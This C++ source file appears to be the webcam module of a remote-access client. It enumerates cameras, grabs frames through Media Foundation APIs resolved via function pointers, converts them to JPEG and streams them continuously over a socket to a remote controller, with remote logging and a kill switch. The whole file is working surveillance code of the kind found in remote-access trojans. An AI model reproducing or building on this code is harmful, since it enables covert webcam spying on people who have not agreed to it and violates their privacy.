#include "cliente.hpp"
#include "mod_camara.hpp"
#include "misc.hpp"

extern Cliente* cCliente;


//Conversion functions
int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    if (!this->GDIPLUS.pGetImageEncodersSize || !this->GDIPLUS.pGetImageEncoders) {
        __DBG_("[X]GetEncoderClsid error");
        return -1;
    }

    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    this->GDIPLUS.pGetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    this->GDIPLUS.pGetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

std::vector<BYTE> mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPerPixel, const unsigned long& padding_size, DWORD iBuffersize) {
    //Liberar buffer retornado
    unsigned long headers_size = sizeof(BITMAPFILEHEADER) +
        sizeof(BITMAPINFOHEADER);

    unsigned long pixel_data_size = lHeight * ((lWidth * (wBitsPerPixel / 8)) + padding_size);

    BITMAPINFOHEADER bmpInfoHeader = { 0 };

    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfoHeader.biBitCount = wBitsPerPixel;
    bmpInfoHeader.biClrImportant = 0;
    bmpInfoHeader.biClrUsed = 0;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biHeight = lHeight;
    bmpInfoHeader.biWidth = lWidth;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biSizeImage = pixel_data_size;

    BITMAPFILEHEADER bfh;
    ZeroMemory(&bfh, sizeof(bfh));
    bfh.bfType = 'MB';

    bfh.bfOffBits = headers_size;

    bfh.bfSize = headers_size + pixel_data_size;

    unsigned int uiHeadsize = sizeof(bfh) + sizeof(bmpInfoHeader);
    
    std::vector<BYTE> nBuffer(uiHeadsize);
    memcpy(nBuffer.data(), &bfh, sizeof(bfh));
    memcpy(nBuffer.data() + sizeof(bfh), &bmpInfoHeader, sizeof(bmpInfoHeader));

    return nBuffer;
}

std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) {
    //Liberar buffer despues de haberse usado
    std::vector<BYTE> bJPEGbuffer;

    if (!this->GDIPLUS.pGdiplusStartup || !this->KERNEL32.pGlobalAlloc || !this->SHLWAPI.pSHCreateMemStream ||
        !this->OLE32.pCreateStreamOnHGlobal || !this->GDIPLUS.pFromStream || !this->GDIPLUS.pGdiplusShutdown ||
        !this->KERNEL32.pGlobalFree) {
        __DBG_("[X]toJPEG error");
        return bJPEGbuffer;
    }
    HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    this->GDIPLUS.pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    Gdiplus::Image* nImage = nullptr;
    Gdiplus::Status  stat;
    STATSTG statstg;
    IStream* oStream;
    IStream* nStream;
    CLSID   encoderClsid;
    ULONG bytesRead;
    u_int uiBuffS = 0;
    int iRet = 0;

    HRESULT hr;

    nStream = this->SHLWAPI.pSHCreateMemStream(bmpBuffer, uiBuffersize);
    if (!nStream) {
        __DBG_("[X] SHCreateMemStream error");
        cCliente->m_RemoteLog("[WEBCAM] SHCreateMemStream error : " + std::to_string(GetLastError()));
        goto release;
    }

    hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        __DBG_("[X] CreateStreamOnHGlobal error");
        cCliente->m_RemoteLog("[WEBCAM] CreateStreamOnHGlobal error : " + std::to_string(GetLastError()));
        goto release;
    }

    nStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

    nImage = this->GDIPLUS.pFromStream(nStream, FALSE);
    if (nImage == nullptr || nImage->GetLastStatus() != Gdiplus::Ok) {
        __DBG_("[X] Gdiplus::Image::FromStream error");
        cCliente->m_RemoteLog("[WEBCAM] Gdiplus::Image::FromStream error : " + std::to_string(GetLastError()));
        goto release;
    }

    
    iRet = this->GetEncoderClsid(L"image/jpeg", &encoderClsid);
    if (iRet == -1) {
        __DBG_("[X] image/jpeg not found trying PNG...");
        iRet = this->GetEncoderClsid(L"image/png", &encoderClsid);
        if (iRet == -1) {
            __DBG_("[X] image/png not found bye...");
            goto release;
        }
    }

    //stat = nImage->Save(oStream, &encoderClsid, NULL);
    stat = this->GDIPLUS.pGdipSaveImageToStream(nImage, oStream, &encoderClsid, NULL);
    if (stat != Gdiplus::Ok) {
        __DBG_("[X] nImage->Save");
        goto release;
    }

    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr != S_OK) {
        __DBG_("[X] oStream->Stat");
        goto release;
    }

    uiBuffS = statstg.cbSize.LowPart; //Asuming is lower than 4G duuuh
    bJPEGbuffer.resize(uiBuffS, 0);


    oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

    hr = oStream->Read(bJPEGbuffer.data(), uiBuffS, &bytesRead);
    if (hr != S_OK) {
        __DBG_("[X] oStream->Read");
    }


    release:

    oStream->Release();
    nStream->Release();


    if (nImage) {
        delete nImage;
        nImage = nullptr;
    }

    this->GDIPLUS.pGdiplusShutdown(gdiplusToken);
    this->KERNEL32.pGlobalFree(hGlobalMem);

    return bJPEGbuffer;
}

HRESULT mod_Camera::ListCaptureDevices(std::vector<IMFActivate*>& devices){
    if (!this->MFPLAT.pMFCreateAttributes || !this->MF.pMFEnumDeviceSources || !this->OLE32.pCoTaskMemFree) {
        __DBG_("[X]mod_cam ListCaptureDevices error");
        return E_FAIL;
    }

    IMFAttributes* pAttributes = NULL;
    HRESULT hr = this->MFPLAT.pMFCreateAttributes(&pAttributes, 1);
    if (SUCCEEDED(hr)){
        hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        if (SUCCEEDED(hr)){
            UINT32 count = 0;
            IMFActivate** ppDevices = NULL;
            hr = this->MF.pMFEnumDeviceSources(pAttributes, &ppDevices, &count);
            if (SUCCEEDED(hr)){
                for (UINT32 i = 0; i < count; i++){
                    devices.push_back(ppDevices[i]);
                }
                this->OLE32.pCoTaskMemFree(ppDevices);
            }
        }
        pAttributes->Release();
    }
    return hr;
}

std::vector<std::string> mod_Camera::ListNameCaptureDevices() {
    std::vector<std::string> vcDevices;

    if (!this->MFPLAT.pMFCreateAttributes || !this->MF.pMFEnumDeviceSources ||
        !this->OLE32.pCoTaskMemFree) {
        __DBG_("[X]mod_cam ListNameCaptureDevices error");
        return vcDevices;
    }

    IMFAttributes* pAttributes = NULL;
    bool vcFlag = this->vcCamObjs.size() > 0 ? true : false;
    HRESULT hr = this->MFPLAT.pMFCreateAttributes(&pAttributes, 1);
    if (SUCCEEDED(hr)){
        hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        if (SUCCEEDED(hr)){
            UINT32 count = 0;
            IMFActivate** ppDevices = NULL;
            hr = this->MF.pMFEnumDeviceSources(pAttributes, &ppDevices, &count);
            if (SUCCEEDED(hr)){
                for (UINT32 i = 0; (i < count && i < MAX_CAMS); i++){
                    WCHAR* szFriendlyName = NULL;
                    UINT32 cchName;

                    hr = ppDevices[i]->GetAllocatedString(
                        MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
                        &szFriendlyName, &cchName);
                    if (SUCCEEDED(hr)){
                        char cBuffer[100];
                        memset(cBuffer, 0, sizeof(cBuffer));

                        size_t iRet;
                        wcstombs_s(&iRet, cBuffer, sizeof(cBuffer), szFriendlyName, sizeof(cBuffer) - 1);
                        vcDevices.push_back(std::string(cBuffer));
                    }

                    //Ya se crearon los objetos, solo obtener los nombres de los dispositivos conectados
                    if(vcFlag){
                        continue;
                    }

                    struct camOBJ cam_Temp;
                    cam_Temp.isActivated = cam_Temp.isLive = cam_Temp.isConvert = false;
                    cam_Temp.sActivate = ppDevices[i];
                    cam_Temp.sReader = nullptr;
                    cam_Temp.sSource = nullptr;

                    this->vcCamObjs.push_back(cam_Temp);
                    
                    this->OLE32.pCoTaskMemFree(szFriendlyName);
                }
                this->OLE32.pCoTaskMemFree(ppDevices);
            }
        }
        pAttributes->Release();
    }
    return vcDevices;
}

HRESULT mod_Camera::ConfigureSourceReader(IMFSourceReader*& pReader, int pIndexDev){
    if (!this->MFAPI.pMFGetAttributeSize || !this->MFAPI.pMFGetAttributeRatio) {
        __DBG_("[X] mod_cam ConfigureSourceReader error");
        return E_FAIL;
    }
    // The list of acceptable types.
    /*GUID subtypes[] = {
        MFVideoFormat_NV12, MFVideoFormat_YUY2, MFVideoFormat_UYVY,
        MFVideoFormat_RGB32, MFVideoFormat_RGB24, MFVideoFormat_IYUV
    };*/
    GUID subtypes[] = {
         MFVideoFormat_RGB32, MFVideoFormat_RGB24
    };

    GUID subtypes2[] = {
        MFVideoFormat_NV12, MFVideoFormat_YUY2, MFVideoFormat_UYVY,
        MFVideoFormat_IYUV, MFVideoFormat_MJPG, MFVideoFormat_H264
    };

    HRESULT hr = S_OK;
    BOOL    bUseNativeType = FALSE;

    GUID subtype = { 0 };

    IMFMediaType* pType = NULL;

    // If the source's native format matches any of the formats in 
    // the list, prefer the native format.
    // Note: The camera might support multiple output formats, 
    // including a range of frame dimensions. The application could
    // provide a list to the user and have the user select the
    // camera's output format. That is outside the scope of this
    // sample, however.

    hr = pReader->GetNativeMediaType(
        (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
        0,  // Type index
        &pType
    );

    if (FAILED(hr)) { goto done; }

    hr = pType->GetGUID(MF_MT_SUBTYPE, &subtype);

    if (FAILED(hr)) { goto done; }

    for (UINT32 i = 0; i < ARRAYSIZE(subtypes); i++)
    {
        if (subtype == subtypes[i])
        {
            hr = pReader->SetCurrentMediaType(
                (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                NULL,
                pType
            );

            bUseNativeType = TRUE;
            break;
        }
    }

    if (!bUseNativeType)
    {
        // None of the native types worked. The camera might offer 
        // output a compressed type such as MJPEG or DV.

        // Try adding a decoder.

        for (UINT32 i = 0; i < ARRAYSIZE(subtypes2); i++)
        {
            hr = pType->SetGUID(MF_MT_SUBTYPE, subtypes2[i]);

            if (FAILED(hr)) { goto done; }

            hr = pReader->SetCurrentMediaType(
                (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                NULL,
                pType
            );

            if (SUCCEEDED(hr))
            {
                this->vcCamObjs[pIndexDev].isConvert = true; //No esta en formato RG32 o RGB24
                this->vcCamObjs[pIndexDev].mediaType = subtypes2[i];
                break;
            }
        }
    }

    //Obtener resolution de buffer capturado
    hr = this->MFAPI.pMFGetAttributeSize(pType, MF_MT_FRAME_SIZE, &this->vcCamObjs[pIndexDev].width, &this->vcCamObjs[pIndexDev].height);
    hr = this->MFAPI.pMFGetAttributeRatio(pType, MF_MT_FRAME_RATE, &this->vcCamObjs[pIndexDev].numerator, &this->vcCamObjs[pIndexDev].denominator);

done:

    SafeRelease(&pType);
    return hr;
}

HRESULT mod_Camera::ConfigureCapture(IMFSourceReader*& pReader, int pIndexDev){
    HRESULT hr = S_OK;
    IMFMediaType* pType = NULL;

    hr = ConfigureSourceReader(pReader, pIndexDev);

    if (SUCCEEDED(hr)){
        hr = pReader->GetCurrentMediaType(
            (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
            &pType
        );
    }

    SafeRelease(&pType);
    return hr;
}

HRESULT mod_Camera::OpenMediaSource(IMFMediaSource*& pSource, IMFSourceReader*& pReader){
    if (!this->MFPLAT.pMFCreateAttributes || !this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource) {
        __DBG_("[X] mod_cam OpenMediaSource error");
        return E_FAIL;
    }

    HRESULT hr = S_OK;

    IMFAttributes* pAttributes = NULL;
    
    hr = this->MFPLAT.pMFCreateAttributes(&pAttributes, 2);

    if (SUCCEEDED(hr)){
        hr = pAttributes->SetUnknown(MF_SOURCE_READER_ASYNC_CALLBACK, NULL);
    }

    if (SUCCEEDED(hr)) {
        hr = this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource(
            pSource,
            pAttributes,
            &pReader
        );    
    }
    
    SafeRelease(&pAttributes);
    return hr;
}

HRESULT mod_Camera::Init(IMFActivate*& pDevice, int pIndexDev) {
    //Liberar en dado caso este previamente iniciada
    this->vcCamObjs[pIndexDev].ReleaseCam();

    HRESULT hr = S_OK;
    
    hr = pDevice->ActivateObject(__uuidof(IMFMediaSource), (void**)&this->vcCamObjs[pIndexDev].sSource);

    if (SUCCEEDED(hr)){
        hr = OpenMediaSource(this->vcCamObjs[pIndexDev].sSource, this->vcCamObjs[pIndexDev].sReader);
    }

    if (SUCCEEDED(hr)){
        hr = ConfigureCapture(this->vcCamObjs[pIndexDev].sReader, pIndexDev);
    }

    return hr;
}

std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
    //Liberar buffer retornado despues de haberse usado
    
    std::vector<BYTE> cBufferOut;

    if(!this->MFPLAT.pMFTRegisterLocalByCLSID || !this->OLE32.pCoCreateInstance ||
        !this->MFPLAT.pMFCreateMediaType || !this->MFAPI.pMFSetAttributeSize ||
        !this->MFAPI.pMFSetAttributeRatio || !this->MFPLAT.pMFCreateSample ||
        !this->MFPLAT.pMFCreateMemoryBuffer){
        __DBG_("[X] mod_cam GetFrame error");
        return cBufferOut;
    }

    DWORD streamIndex, flags;
    LONGLONG llTimeStamp;
    IMFSample* pSample = NULL;
    HRESULT hr;
    //Hay que hacer un loop hasta que tome el frame
    while (1) {
        //hr = this->vc_pReader[pIndexDev]->ReadSample(
        hr = this->vcCamObjs[pIndexDev].sReader->ReadSample(
            (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
            0,
            &streamIndex, // Receives the actual stream index.
            &flags, // Receives the stream flags.
            &llTimeStamp, // Receives the timestamp.
            &pSample // Receives the sample or NULL.
        );

        if (FAILED(hr)) {
            break;
        }

        if (flags & MF_SOURCE_READERF_ENDOFSTREAM) {
            break;
        }

        if (pSample == NULL) {
            continue;
        }

        //We got a sample
        break;
    }

    if (SUCCEEDED(hr) && pSample != NULL){
        IMFMediaBuffer* pBuffer = NULL;
        IMFMediaBuffer* npBuffer = nullptr;
        IMFSample* pOutSample = nullptr;

        //El formato de la camara no esta en los soportados (probados)
        if (this->vcCamObjs[pIndexDev].isConvert) {
            IMFTransform* pTransform = nullptr;
            IMFMediaType* pInputType = nullptr;
            IMFMediaType* pOutputType = nullptr;
            
            DWORD pcInputStreams = 0;
            DWORD pcOutputStreams = 0;
            DWORD m_dwInputID = 0;
            DWORD m_dwOutputID = 0;
            DWORD outputStatus = 0;
            DWORD dwProcessOutputStatus = 0;
            MFT_OUTPUT_STREAM_INFO StreamInfo;

            HRESULT ttRES = S_OK;
            //pTransform
            this->MFPLAT.pMFTRegisterLocalByCLSID(CLSID_CColorConvertDMO, MFT_CATEGORY_VIDEO_PROCESSOR, L"", MFT_ENUM_FLAG_SYNCMFT, 0, NULL, 0, NULL);
            ttRES = this->OLE32.pCoCreateInstance(CLSID_CColorConvertDMO, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pTransform));

            ttRES = pTransform->GetStreamIDs(1, &m_dwInputID, 1, &m_dwOutputID);

            if (ttRES == E_NOTIMPL)
            {
                // The stream identifiers are zero-based.
                m_dwInputID = 0;
                m_dwOutputID = 0;
                ttRES = S_OK;
            }

            //pInputType
            ttRES = this->MFPLAT.pMFCreateMediaType(&pInputType);
            ttRES = pInputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
            ttRES = pInputType->SetGUID(MF_MT_SUBTYPE, this->vcCamObjs[pIndexDev].mediaType);
            ttRES = this->MFAPI.pMFSetAttributeSize(pInputType, MF_MT_FRAME_SIZE, this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height);
            ttRES = this->MFAPI.pMFSetAttributeRatio(pInputType, MF_MT_FRAME_RATE, this->vcCamObjs[pIndexDev].numerator, this->vcCamObjs[pIndexDev].denominator);
            ttRES = this->MFAPI.pMFSetAttributeRatio(pInputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
            ttRES = pTransform->SetInputType(m_dwInputID, pInputType, 0);

            //pOutputType
            ttRES = this->MFPLAT.pMFCreateMediaType(&pOutputType);
            ttRES = pOutputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
            ttRES = pOutputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB24);
            ttRES = pOutputType->SetUINT32(MF_MT_FIXED_SIZE_SAMPLES, 1);
            ttRES = pOutputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
            ttRES = pOutputType->SetUINT32(MF_MT_ALL_SAMPLES_INDEPENDENT, TRUE);
            ttRES = this->MFAPI.pMFSetAttributeSize(pOutputType, MF_MT_FRAME_SIZE, this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height);
            ttRES = this->MFAPI.pMFSetAttributeRatio(pOutputType, MF_MT_FRAME_RATE, this->vcCamObjs[pIndexDev].numerator, this->vcCamObjs[pIndexDev].denominator);
            ttRES = this->MFAPI.pMFSetAttributeRatio(pOutputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);


            ttRES = pTransform->SetOutputType(m_dwOutputID, pOutputType, 0);
            ttRES = pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
            
            ttRES = pTransform->GetOutputStreamInfo(m_dwOutputID, &StreamInfo);

            this->MFPLAT.pMFCreateSample(&pOutSample);

            this->MFPLAT.pMFCreateMemoryBuffer(StreamInfo.cbSize, &npBuffer);
            pOutSample->AddBuffer(npBuffer);

            MFT_OUTPUT_DATA_BUFFER outputDataBuffer;
            outputDataBuffer.dwStreamID = m_dwOutputID;
            outputDataBuffer.pSample = pOutSample;
            outputDataBuffer.dwStatus = 0;
            outputDataBuffer.pEvents = nullptr;

            HRESULT hInput = S_OK;
        processInputAgain:
            while (1) {
                hInput = pTransform->ProcessInput(m_dwInputID, pSample, 0);
                if (hInput == MF_E_NOTACCEPTING) {
                    break;
                }
            }

            ttRES = pTransform->GetOutputStatus(&outputStatus);

            if (ttRES != S_OK && ttRES != E_NOTIMPL) {
                goto processInputAgain;
            }

            ttRES = pTransform->ProcessOutput(0, 1, &outputDataBuffer, &dwProcessOutputStatus);
            ttRES = pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_END_OF_STREAM, 0);
            ttRES = pTransform->ProcessMessage(MFT_MESSAGE_COMMAND_DRAIN, 0);

            hr = pOutSample->ConvertToContiguousBuffer(&pBuffer);
        }else {
            hr = pSample->ConvertToContiguousBuffer(&pBuffer);
        }

        if (SUCCEEDED(hr)){
            BYTE* pData = NULL;
            DWORD maxLength = 0, currentLength = 0;

            hr = pBuffer->Lock(&pData, &maxLength, &currentLength);
            if (SUCCEEDED(hr))
            {
                // Unlock the buffer when done.

                std::vector<BYTE> bmpHeadBuff = this->bmpHeader(this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height, 24, 0, currentLength);
                int iOutSize = bmpHeadBuff.size();
                if (iOutSize > 0) {
                    cBufferOut.resize(currentLength + iOutSize, 0);
                    memcpy(cBufferOut.data(), bmpHeadBuff.data(), iOutSize);
                    memcpy(cBufferOut.data() + iOutSize, pData, currentLength);
                } else {
                    __DBG_("[X] No se pudo crear la cabecera bmp");
                }

                pBuffer->Unlock();
            }
            pBuffer->Release();
        }
        if (this->vcCamObjs[pIndexDev].isConvert) {
            if (npBuffer) {
                npBuffer->Release();
                npBuffer = nullptr;
            }
            if (pOutSample) {
                pOutSample->Release();
                pOutSample = nullptr;
            }
        }
        pSample->Release();
    }

    return cBufferOut;
}

void mod_Camera::SpawnLive(int pIndexDev) {
    this->thLive[pIndexDev] = std::thread(&mod_Camera::LiveCam, this, pIndexDev);
}

void mod_Camera::JoinLiveThread(int pIndexDev) {
    if (this->thLive[pIndexDev].joinable()) {
        this->vcCamObjs[pIndexDev].isLive = false;
        this->thLive[pIndexDev].join();
    }

    this->vcCamObjs[pIndexDev].ReleaseCam();
}

void mod_Camera::LiveCam(int pIndexDev) {
    HRESULT hr = S_OK;

    hr = this->Init(this->vcCamObjs[pIndexDev].sActivate, pIndexDev);
    
    if (SUCCEEDED(hr)) {
        this->vcCamObjs[pIndexDev].isActivated = this->vcCamObjs[pIndexDev].isLive = true;

        __DBG_("[!]Live iniciado");
        cCliente->m_RemoteLog("[WEBCAM] Live iniciado");

        std::string strHeader = std::to_string(pIndexDev);
        strHeader.append(1, CMD_DEL);

        int iHeaderSize = strHeader.size();

        while (this->vcCamObjs[pIndexDev].isLive) {
            //Kill swith
            if (cCliente->isKillSwitch()) {
                __DBG_("[CAM] kill_switch...");
                cCliente->setKillSwitch(false);
                this->vcCamObjs[pIndexDev].isLive = false;
                break;
            }

            u_int uiPacketSize = 0;
            std::vector<BYTE> cBuffer = this->GetFrame(pIndexDev);
            
            if (cBuffer.size() > 0) {
                std::vector<BYTE> cJPGBuffer = this->toJPEG(cBuffer.data(), cBuffer.size());
                if (cJPGBuffer.size() > 0) {
                    uiPacketSize = iHeaderSize + cJPGBuffer.size();
                    std::vector<char> cPacket(uiPacketSize);
                    if (cPacket.size() == uiPacketSize) {
                        memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
                        memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), cJPGBuffer.size());
                        
                        int iSent = cCliente->cChunkSend(cCliente->sckSocket, cPacket.data(), uiPacketSize, 0, true, nullptr, EnumComandos::CM_Single_Salida);
                        if (iSent == -1) {
                            this->vcCamObjs[pIndexDev].isLive = false;
                            break;
                        }
                    }

                }
            }
        }

        __DBG_("[!]Live terminado");
        cCliente->m_RemoteLog("[WEBCAM] Live finalizado");
    }
}

mod_Camera::mod_Camera(st_GdiPlus& _gdiplus, st_Shlwapi& _shlwapi, st_Mfplat& _mfplat,
    st_Mf& _mf, st_Mfapi& _mfapi, st_Mfreadwrite& _mfreadwrite, st_Ole32& _ole32, st_Kernel32& _kernel32) {
    this->GDIPLUS = _gdiplus;
    this->KERNEL32 = _kernel32;
    this->OLE32 = _ole32;
    this->SHLWAPI = _shlwapi;
    this->MFPLAT = _mfplat;
    this->MF = _mf;
    this->MFAPI = _mfapi;
    this->MFREADWRITE = _mfreadwrite;

    if (this->OLE32.pCoInitialize && this->MFPLAT.pMFStartup) {
        this->OLE32.pCoInitialize(nullptr);
        this->MFPLAT.pMFStartup(MF_VERSION, MFSTARTUP_FULL);
    } else {
        __DBG_("[X]mod_cam init error dll");
    }
}

mod_Camera::~mod_Camera() {
    for (int iThNum = 0; iThNum < MAX_CAMS; iThNum++) {
        if (this->thLive[iThNum].joinable()) {
            this->thLive[iThNum].join();
        }
    }
    for (int iCount = 0; iCount<int(this->vcCamObjs.size()); iCount++) {
        this->vcCamObjs[iCount].ReleaseCam();
    }

    if (this->OLE32.pCoUninitialize && this->MFPLAT.pMFShutdown) {
        this->OLE32.pCoUninitialize();
        this->MFPLAT.pMFShutdown();
    }else {
        __DBG_("[X]mod_cam shutdown error dll");
    }
}
